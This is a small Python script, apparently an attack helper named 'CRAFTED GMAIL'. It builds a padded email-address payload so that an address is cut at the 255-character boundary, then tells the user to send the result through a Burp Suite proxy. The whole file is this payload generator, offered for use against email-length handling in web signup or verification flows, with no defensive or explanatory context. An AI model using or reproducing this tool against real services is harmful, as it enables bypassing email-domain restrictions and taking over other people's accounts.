import time
from pyfiglet import figlet_format

print(figlet_format("CRAFTED GMAIL"))
time.sleep(1)
print("📧 Created by: 127.0.0.1")

Mail = input("enter a mail and it extend first enter dot after give mail 📢 ->")
if Mail[0] == "." :
    print("Lets GO 🏃‍♀️‍➡️🏃‍♀️‍➡️")
else:
    print("Start by entring dot 😁😁 ")
    exit()
length = len(Mail)
Gmail = input("enter a only email now without extend  🙊🙊->")
leng  = len(Gmail)
print(f"we nedd 255th character must be last position in mail is M")
Position = 255-leng
print(f" U need {Position} alphabets lets create ->")
alphabet = input("enter a your lucky alphabet ❤️❤️-> ")
if len(alphabet) == 1:
    print(f"you need {Position} alphabets")
    characters = alphabet * Position
    crafted_gmail = characters + Gmail + Mail
    print(f"pass through Burp Suite proxy -> {crafted_gmail} <- u will got result")
else:
    print("U did Mistake bro 🤷‍♂️🤷‍♂️🤷‍♂️")